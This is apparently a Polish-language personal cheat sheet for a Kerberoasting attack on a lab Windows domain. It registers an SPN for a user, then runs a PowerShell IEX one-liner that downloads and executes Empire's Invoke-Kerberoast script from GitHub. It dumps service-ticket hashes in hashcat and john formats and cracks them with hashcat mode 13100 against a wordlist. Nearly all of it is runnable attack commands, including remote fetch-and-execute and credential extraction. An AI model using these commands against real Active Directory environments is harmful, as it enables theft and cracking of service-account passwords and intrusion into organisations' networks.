---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Invoke-Kerberoast

**Windows Server**

stworzenie jakiejkolwiek usługi sieciowej SPN = Service Principal Names dla użytkownika bob&#x20;

```
.\setspn.exe -s http/cyber.local:80 bob
```

podgląd opisu tej usługi

```
.\setspn.exe -T cyber.local -Q */*
```

**Win**

{% code overflow="wrap" fullWidth="true" %}
```
IEX(New-Object System.Net.WebClient).DownloadString(https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
```
{% endcode %}

przechwytywania ticketa i zapisywanie dla hashcata lub john i pozbycie sie dziwnych znaków

{% code fullWidth="true" %}
```
Invoke-Kerberoast -OutputFormat hashcat | % {$_.Hash} | Out-File -Encoding ASCII bilet_serwisowy_http
Invoke-Kerberoast -OutputFormat john | % {$_.Hash} | Out-File -Encoding ASCII bilet_serwisowy_http
```
{% endcode %}

**Kali**

zapisujemy hash do pliku tgs\_hash

crackowanie hasha - sprawdzamy w hashcat jaki numer ma nasz typ hasha

```
hashcat -h | less

hashcat -m 13100 tgs_hash /usr/share/wordlists/rockypu.txt
```
